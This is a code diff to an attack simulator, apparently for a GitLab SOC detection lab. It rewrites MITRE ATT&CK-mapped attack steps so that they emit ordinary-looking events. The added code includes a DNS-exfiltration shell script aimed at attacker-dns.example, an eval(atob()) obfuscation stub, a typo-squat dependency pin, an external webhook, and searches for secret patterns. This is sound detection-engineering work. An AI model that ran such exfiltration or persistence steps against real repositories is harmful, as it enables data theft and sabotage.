@@ -160,14 +160,23 @@ class AnomalyActivity:
 
     # === РАЗВЕДКА =======================================================
     def _a_recon_enumeration(self, actor):
-        """Перебор репозиториев и листинг секрет-путей (Reconnaissance)."""
+        """Перебор репозиториев и листинг секрет-путей (Reconnaissance).
+
+        НОРМАЛИЗОВАНО: раньше эмитилось действие `repo_enum`, которого у
+        обычных сотрудников не бывает — правило `{"action": "repo_enum"}`
+        читало метку. Теперь это серия обычных `api_read`, как в аудит-логе
+        GitLab. Отличить разведку от обычного просмотра можно только по
+        частоте и объёму выдачи — этим занимается детектор.
+        """
         targets = random.sample(
-            ["detection-rules", "soc-secrets", "soc-infra", "playbooks", "normalization-rules"],
-            k=min(3, 5))
+            ["detection-rules", "soc-secrets", "soc-infra", "playbooks", "normalization-rules"], k=5)
         with events.tag(is_decisive=True, detail="enumerated repos and secret paths"):
-            events.emit("repo_enum", actor=actor.username, role=actor.role,
-                        project="soc-infra", target=",".join(targets),
-                        message="listed repositories and secret-bearing paths")
+            for i, tgt in enumerate(targets):
+                events.emit("api_read", actor=actor.username, role=actor.role,
+                            project=tgt, message="GET /projects tree listing",
+                            extra={"api_path": "/projects" if i == 0 else "/repository/tree",
+                                   "items_returned": random.randint(40, 120),
+                                   "is_decisive": i == 0})
         return True
 
     # === СЕКРЕТЫ =======================================================
@@ -328,17 +337,32 @@ class AnomalyActivity:
                                    "chore: update soc-secrets access list", branch)
 
     def _a_rogue_token(self, actor):
+        """Лишний токен на чужого пользователя.
+
+        Действие `token_create` теперь есть и у обычной команды (ротация своих
+        read-токенов). Наблюдаемое отличие: scope=api, бессрочный, выписан
+        НЕ СЕБЕ — на этом и должно строиться правило.
+        """
         target = random.choice(["maria.ivanova", "dmitry.kozlov", "anna.smirnova"])
         ok = actor.gl.create_named_token(USERS[target]["id"],
                                          name="ci-temp-" + datetime.now().strftime("%H%M%S"),
                                          scopes=["api"])
         events.emit("token_create", actor=actor.username, role=actor.role,
                     target=target, message="created additional API token",
-                    extra={"token_scope": "api", "for_user": target, "is_decisive": True})
+                    extra={"token_scope": "api", "for_user": target, "for_self": False,
+                           "expires_days": None, "is_decisive": True})
         return ok
 
     # === РАЗРУШИТЕЛЬНЫЕ ================================================
     def _a_mass_deletion(self, actor):
+        """Массовое удаление файлов.
+
+        НОРМАЛИЗОВАНО: раньше эмитилось одно агрегированное событие
+        `mass_delete`, которого нет в обычной работе. Теперь — N обычных
+        `file_delete`, ровно как их порождает commit_changes() у нормального
+        сотрудника. «Массовость» детектор обязан вывести сам, из всплеска
+        удалений в окне (см. detector.Enricher / правило mass-file-delete).
+        """
         name, pid = self._repo(random.choice(["detection-rules", "normalization-rules"]))
         files = [f for f in actor.gl.list_files(pid, "rules") if f.endswith(".yml")]
         if len(files) < 5:
@@ -351,9 +375,10 @@ class AnomalyActivity:
             return False
         actions = [{"action": "delete", "file_path": f} for f in victims]
         ok = actor.gl.create_commit(pid, branch, "chore: cleanup old files", actions, actor.token)
-        events.emit("mass_delete", actor=actor.username, role=actor.role, project=name,
-                    branch=branch, message=f"deleted {len(victims)} files",
-                    extra={"deleted_count": len(victims), "is_decisive": True})
+        for i, f in enumerate(victims):
+            events.emit("file_delete", actor=actor.username, role=actor.role, project=name,
+                        branch=branch, path=f, message="chore: cleanup old files",
+                        extra={"is_decisive": i == len(victims) - 1})
         return ok
 
     # === ПАЙПЛАЙНЫ / ТОКЕНЫ ============================================
@@ -438,151 +463,238 @@ class AnomalyActivity:
             return actor.push_file(pid, self._ev_path("export/dump_b64.txt"), self._ev_content(content),
                                    "chore: nightly data export", branch)
 
-    # === НОВЫЕ ПРИМИТИВЫ: расширяют покрытие ATT&CK ====================
-    # Каждый эмитит СВОЁ действие, под которое есть отдельное правило.
-    # Действия синтетические (как repo_enum) — это шаг атаки в журнале,
-    # а не изменение в GitLab; детектор ловит их по наблюдаемому действию.
+    # === ПРИМИТИВЫ НА НОРМАЛИЗОВАННЫХ ДЕЙСТВИЯХ ========================
+    # Раньше каждый шаг эмитил СВОЁ говорящее действие (steal_oauth,
+    # perm_discovery, webhook_c2 ...), которого у обычных сотрудников не
+    # бывает, и правило вида {"action": "steal_oauth"} читало метку, а не
+    # обнаруживало атаку.
+    #
+    # Теперь все шаги описаны действиями из taxonomy.OBSERVABLE — теми же,
+    # что порождает нормальная работа команды. Атака отличается только
+    # НАБЛЮДАЕМЫМИ АТРИБУТАМИ: scope токена, внешний хост вебхука, уровень
+    # доступа, ночное расписание, энтропия содержимого, объём выдачи API.
+    # Детектор обязан вывести технику из атрибутов.
 
     def _a_scheduled_ci_job(self, actor):
-        """Плановое задание CI, запускающее полезную нагрузку атакующего.
-        MITRE T1053 Scheduled Task/Job (Execution)."""
+        """Ночное расписание пайплайна под контролем атакующего.
+        T1053 Scheduled Task/Job. Норма тоже заводит расписания (ночные сборки),
+        отличие — расписание на защищённой ветке + ручной прогон следом."""
         name, _ = self._repo()
         with events.tag(is_decisive=True, repo=name,
                         detail="attacker-controlled scheduled pipeline added"):
-            events.emit("ci_schedule", actor=actor.username, role=actor.role,
-                        project=name, path=".gitlab-ci.yml", branch="main",
+            events.emit("schedule_create", actor=actor.username, role=actor.role,
+                        project=name, branch="main",
                         message="ci: add nightly scheduled pipeline",
-                        target="schedule:0 3 * * *")
+                        extra={"cron": "0 3 * * *", "is_night_cron": True,
+                               "protected_branch": True, "target_env": "production"})
+            events.emit("pipeline_run", actor=actor.username, role=actor.role,
+                        project=name, branch="main", message="ci: run pipeline",
+                        extra={"manual_trigger": True, "target_env": "production"})
         return True
 
     def _a_container_creds(self, actor):
-        """Секрет доступа к контейнерному реестру/кластеру в манифесте.
-        MITRE T1552.007 Container API Credentials (Credential Access)."""
-        name, _ = self._repo()
+        """Учётные данные реестра в манифесте k8s. T1552.007.
+        Обычный push — распознаётся по содержимому, а не по имени действия."""
+        name, pid = self._repo()
+        secret = "dockerconfigjson: " + "".join(
+            random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
+            for _ in range(220)) + "=="
+        content = ("apiVersion: v1\nkind: Secret\ntype: kubernetes.io/dockerconfigjson\n"
+                   "metadata:\n  name: prod-registry\ndata:\n  ." + secret + "\n")
+        branch = actor.unique_branch("deploy/registry")
+        if not actor.create_branch(pid, branch):
+            return False
         with events.tag(is_decisive=True, repo=name, secret_type="container_creds",
                         detail="registry/cluster credentials in a k8s manifest"):
-            events.emit("container_creds", actor=actor.username, role=actor.role,
-                        project=name, path="deploy/k8s/registry-secret.yaml", branch="main",
-                        message="deploy: add imagePullSecret for prod registry")
-        return True
+            return actor.push_file(pid, self._ev_path("deploy/k8s/registry-secret.yaml"),
+                                   self._ev_content(content),
+                                   "deploy: add imagePullSecret for prod registry", branch)
 
     def _a_inhibit_recovery(self, actor):
-        """Удаление резервных веток/тегов и истории — мешает восстановлению.
-        MITRE T1490 Inhibit System Recovery (Impact)."""
+        """Удаление резервных веток и тегов. T1490 Inhibit System Recovery.
+        Нормализовано в серию branch_delete — «массовость» выводит детектор."""
         name, _ = self._repo()
+        refs = [f"backup/{k}" for k in ("weekly", "daily", "pre-release", "archive-2025")]
         with events.tag(is_decisive=True, repo=name,
                         detail="backup branches and tags deleted"):
-            events.emit("inhibit_recovery", actor=actor.username, role=actor.role,
-                        project=name, path="refs/backup/*", branch="backup",
-                        message="chore: prune old backup refs",
-                        target="deleted backup/* and release tags")
+            for i, ref in enumerate(refs):
+                events.emit("branch_delete", actor=actor.username, role=actor.role,
+                            project=name, branch=ref, message="chore: prune old backup refs",
+                            extra={"protected_branch": True, "is_decisive": i == len(refs) - 1})
         return True
 
     def _a_add_deploy_key(self, actor):
-        """Добавлен внешний SSH deploy-ключ для доступа к репозиториям.
-        MITRE T1021.004 Remote Services: SSH (Lateral Movement)."""
+        """Внешний SSH deploy-ключ НА ЗАПИСЬ. T1021.004.
+        Норма тоже добавляет deploy-ключи, но read-only и на внутренний хост."""
         name, _ = self._repo()
         with events.tag(is_decisive=True, repo=name, secret_type="ssh_key",
                         detail="external SSH deploy key added to repo"):
             events.emit("deploy_key_add", actor=actor.username, role=actor.role,
-                        project=name, path="settings/deploy_keys", branch="main",
-                        message="ci: add deploy key for build runner",
-                        target="ssh-ed25519 AAAAC3Nz... build@ext")
+                        project=name, message="ci: add deploy key for build runner",
+                        extra={"key_write_access": True, "external_host": True,
+                               "hook_host": "build.ext-runner.io"})
         return True
 
     def _a_code_search(self, actor):
-        """Поиск по коду в поисках секретов. MITRE T1593.003 (Reconnaissance)."""
+        """Поиск секретов по коду. T1593.003.
+        Нормализовано в api_read /search — обычный поиск делают все,
+        отличие в длине запроса под secret-паттерны и объёме выдачи."""
         name, _ = self._repo()
         with events.tag(is_decisive=True, repo=name, detail="searched code for secret patterns"):
-            events.emit("code_search", actor=actor.username, role=actor.role,
-                        project=name, path="search", branch="main",
-                        message="grep across repos for tokens/keys", target="secret patterns")
+            for q in ("password=", "BEGIN RSA PRIVATE KEY", "glpat-", "AKIA"):
+                events.emit("api_read", actor=actor.username, role=actor.role,
+                            project=name, message="GET /search across repos",
+                            extra={"api_path": "/search", "query_len": len(q),
+                                   "items_returned": random.randint(30, 90),
+                                   "is_decisive": q == "glpat-"})
         return True
+
     def _a_dep_poison(self, actor):
-        """Подмена зависимости (supply-chain). MITRE T1195.001 (Initial Access)."""
-        name, _ = self._repo()
+        """Подмена зависимости (typo-squat). T1195.001.
+        Обычный push в requirements.txt — распознаётся по новой закреплённой
+        зависимости, а не по имени действия."""
+        name, pid = self._repo()
+        content = ("requests>=2.31.0\nurllib3>=2.0.0\nFlask>=3.0.0\n"
+                   "internal-utils==9.9.9\n")
+        branch = actor.unique_branch("chore/deps")
+        if not actor.create_branch(pid, branch):
+            return False
         with events.tag(is_decisive=True, repo=name, detail="malicious dependency pinned"):
-            events.emit("dep_poison", actor=actor.username, role=actor.role,
-                        project=name, path="requirements.txt", branch="main",
-                        message="chore: bump internal-utils to 9.9.9", target="internal-utils==9.9.9 (typo-squat)")
-        return True
+            return actor.push_file(pid, "requirements.txt", content,
+                                   "chore: bump internal-utils to 9.9.9", branch,
+                                   extra={"dependency_added": True,
+                                          "dependency_pinned_new": True})
+
     def _a_deploy_tool_abuse(self, actor):
-        """Злоупотребление средством развёртывания. MITRE T1072 (Execution)."""
+        """Средство развёртывания запускает задачу атакующего. T1072.
+        Нормализовано в pipeline_run: норма тоже гоняет пайплайны, отличие —
+        ручной прогон в production в нерабочее время."""
         name, _ = self._repo()
-        with events.tag(is_decisive=True, repo=name, detail="deployment tool used to run attacker task"):
-            events.emit("deploy_tool_abuse", actor=actor.username, role=actor.role,
-                        project=name, path="deploy/ansible/site.yml", branch="main",
-                        message="deploy: run one-off provisioning play", target="runs attacker task on all hosts")
+        with events.tag(is_decisive=True, repo=name,
+                        detail="deployment tool used to run attacker task"):
+            events.emit("pipeline_run", actor=actor.username, role=actor.role,
+                        project=name, branch="main",
+                        message="deploy: run one-off provisioning play",
+                        extra={"manual_trigger": True, "target_env": "production",
+                               "protected_branch": True})
         return True
+
     def _a_cloud_account_create(self, actor):
-        """Создан облачный служебный аккаунт. MITRE T1136.003 (Persistence)."""
+        """Служебный облачный аккаунт с широкими правами. T1136.003.
+        Нормализовано в member_update с максимальным access_level."""
         name, _ = self._repo()
-        with events.tag(is_decisive=True, repo=name, detail="extra cloud service account provisioned"):
-            events.emit("cloud_account_create", actor=actor.username, role=actor.role,
-                        project=name, path="iam/service-accounts.tf", branch="main",
-                        message="iam: add ci-runner service account", target="svc-attacker with broad scopes")
+        with events.tag(is_decisive=True, repo=name,
+                        detail="extra cloud service account provisioned"):
+            events.emit("member_update", actor=actor.username, role=actor.role,
+                        project=name, message="iam: add ci-runner service account",
+                        extra={"access_level": 40, "self_grant": False,
+                               "target_user": "svc-ci-runner", "new_member": True})
         return True
+
     def _a_elevate_privs(self, actor):
-        """Повышение прав через обход контроля. MITRE T1548 (Privilege Escalation)."""
+        """Повышение прав себе. T1548.
+        Норма меняет права участникам (20/30), отличие — Owner и себе."""
         name, _ = self._repo()
         with events.tag(is_decisive=True, repo=name, detail="elevation control bypassed"):
-            events.emit("elevate_privs", actor=actor.username, role=actor.role,
-                        project=name, path="ci/sudoers.d/runner", branch="main",
-                        message="ci: allow runner NOPASSWD sudo", target="runner ALL=(ALL) NOPASSWD:ALL")
+            events.emit("member_update", actor=actor.username, role=actor.role,
+                        project=name, message="access: grant maintainer to runner",
+                        extra={"access_level": 50, "self_grant": True,
+                               "target_user": actor.username})
         return True
+
     def _a_history_rewrite(self, actor):
-        """Переписывание истории и удаление следов. MITRE T1070.004 (Defense Evasion)."""
+        """Переписывание истории, чтобы скрыть следы. T1070.004.
+        Нормализовано в force_push: норма тоже делает force-push после rebase,
+        отличие — защищённая ветка и много потерянных коммитов."""
         name, _ = self._repo()
-        with events.tag(is_decisive=True, repo=name, detail="history rewritten to remove indicators"):
-            events.emit("history_rewrite", actor=actor.username, role=actor.role,
-                        project=name, path="main", branch="main",
-                        message="force-push rewriting history", target="git push --force after filter-branch")
+        with events.tag(is_decisive=True, repo=name,
+                        detail="history rewritten to remove indicators"):
+            events.emit("force_push", actor=actor.username, role=actor.role,
+                        project=name, branch="main",
+                        message="force-push rewriting history",
+                        extra={"protected_branch": True,
+                               "commits_dropped": random.randint(9, 24)})
         return True
+
     def _a_obfuscated_payload(self, actor):
-        """Обфусцированный код в коммите. MITRE T1027 (Defense Evasion)."""
-        name, _ = self._repo()
+        """Обфусцированный код в коммите. T1027.
+        Обычный push .js — распознаётся по энтропии и структуре содержимого."""
+        name, pid = self._repo()
+        blob = "".join(random.choice(
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
+            for _ in range(1400))
+        content = "eval(atob('" + blob + "'));\n"
+        branch = actor.unique_branch("chore/minify")
+        if not actor.create_branch(pid, branch):
+            return False
         with events.tag(is_decisive=True, repo=name, detail="obfuscated payload committed"):
-            events.emit("obfuscated_payload", actor=actor.username, role=actor.role,
-                        project=name, path="scripts/util.min.js", branch="main",
-                        message="chore: minify helper", target="base64/eval-packed payload")
-        return True
+            return actor.push_file(pid, self._ev_path("scripts/util.min.js"),
+                                   self._ev_content(content), "chore: minify helper", branch)
+
     def _a_steal_oauth(self, actor):
-        """Кража OAuth/приложенческого токена. MITRE T1528 (Credential Access)."""
+        """Съём OAuth-токенов приложения. T1528.
+        Нормализовано в api_read /oauth/tokens — обычный GET к API."""
         name, _ = self._repo()
-        with events.tag(is_decisive=True, repo=name, detail="application OAuth token captured"):
-            events.emit("steal_oauth", actor=actor.username, role=actor.role,
-                        project=name, path="ci/oauth_dump.log", branch="main",
-                        message="ci: capture pipeline OAuth token", target="PIPELINE OAuth token exfiltrated")
+        with events.tag(is_decisive=True, repo=name,
+                        detail="application OAuth token captured"):
+            events.emit("api_read", actor=actor.username, role=actor.role,
+                        project=name, message="GET /oauth/tokens",
+                        extra={"api_path": "/oauth/tokens",
+                               "items_returned": random.randint(8, 30)})
         return True
+
     def _a_perm_discovery(self, actor):
-        """Перечисление прав и групп доступа. MITRE T1069 (Discovery)."""
-        name, _ = self._repo()
-        with events.tag(is_decisive=True, repo=name, detail="permission groups enumerated"):
-            events.emit("perm_discovery", actor=actor.username, role=actor.role,
-                        project=name, path="audit/members.txt", branch="main",
-                        message="list project members and roles", target="who has Maintainer/Owner")
+        """Перечисление прав и групп. T1069.
+        Нормализовано в api_read /members по многим проектам подряд."""
+        with events.tag(is_decisive=True, detail="permission groups enumerated"):
+            for i, proj in enumerate(random.sample(list(config.WORK_REPOS), k=min(4, len(config.WORK_REPOS)))):
+                events.emit("api_read", actor=actor.username, role=actor.role,
+                            project=proj, message="GET /members",
+                            extra={"api_path": "/members",
+                                   "items_returned": random.randint(10, 40),
+                                   "is_decisive": i == 0})
         return True
+
     def _a_automated_collection(self, actor):
-        """Автоматический сбор данных из репозиториев. MITRE T1119 (Collection)."""
-        name, _ = self._repo()
-        with events.tag(is_decisive=True, repo=name, detail="automated harvester over repositories"):
-            events.emit("automated_collection", actor=actor.username, role=actor.role,
-                        project=name, path="collect/harvest.sh", branch="main",
-                        message="chore: nightly repo harvester", target="clones all repos and greps secrets")
+        """Автоматический сбор данных из репозиториев. T1119.
+        Нормализовано в серию api_read /repository/archive большого объёма."""
+        with events.tag(is_decisive=True, detail="automated harvester over repositories"):
+            for i, proj in enumerate(random.sample(list(config.WORK_REPOS), k=min(5, len(config.WORK_REPOS)))):
+                events.emit("api_read", actor=actor.username, role=actor.role,
+                            project=proj, message="GET /repository/archive",
+                            extra={"api_path": "/repository/archive",
+                                   "items_returned": random.randint(60, 200),
+                                   "bytes": random.randint(2_000_000, 9_000_000),
+                                   "is_decisive": i == 0})
         return True
+
     def _a_webhook_c2(self, actor):
-        """Управление через внешний веб-сервис. MITRE T1102 (Command and Control)."""
+        """Управление через внешний веб-сервис. T1102.
+        Норма тоже заводит вебхуки, отличие — хост вне периметра."""
         name, _ = self._repo()
-        with events.tag(is_decisive=True, repo=name, detail="outbound webhook to external service"):
-            events.emit("webhook_c2", actor=actor.username, role=actor.role,
-                        project=name, path="settings/webhooks", branch="main",
-                        message="add webhook to external host", target="POST to https://attacker.example/hook")
+        with events.tag(is_decisive=True, repo=name,
+                        detail="outbound webhook to external service"):
+            events.emit("hook_create", actor=actor.username, role=actor.role,
+                        project=name, message="add webhook to external host",
+                        extra={"hook_host": "hook.attacker-cdn.example",
+                               "external_host": True, "on_push": True})
         return True
+
     def _a_exfil_altproto(self, actor):
-        """Вынос по альтернативному протоколу. MITRE T1048 (Exfiltration)."""
-        name, _ = self._repo()
-        with events.tag(is_decisive=True, repo=name, detail="data pushed over scp/dns to external host"):
-            events.emit("exfil_altproto", actor=actor.username, role=actor.role,
-                        project=name, path="ci/upload.sh", branch="main",
-                        message="ci: sync artifacts to remote", target="scp artifacts to attacker host")
-        return True
+        """Вынос по альтернативному протоколу. T1048.
+        Обычный push CI-скрипта — распознаётся по содержимому (внешний хост,
+        scp/dns) и по объёму последующей выгрузки."""
+        name, pid = self._repo()
+        content = ("#!/bin/sh\n"
+                   "tar czf - artifacts/ | base64 -w0 | "
+                   "split -b 200 - /tmp/chunk_\n"
+                   "for f in /tmp/chunk_*; do "
+                   "dig +short $(cat $f).exfil.attacker-dns.example; done\n")
+        branch = actor.unique_branch("ci/sync")
+        if not actor.create_branch(pid, branch):
+            return False
+        with events.tag(is_decisive=True, repo=name,
+                        detail="data pushed over scp/dns to external host"):
+            return actor.push_file(pid, self._ev_path("ci/upload.sh"),
+                                   self._ev_content(content),
+                                   "ci: sync artifacts to remote", branch)
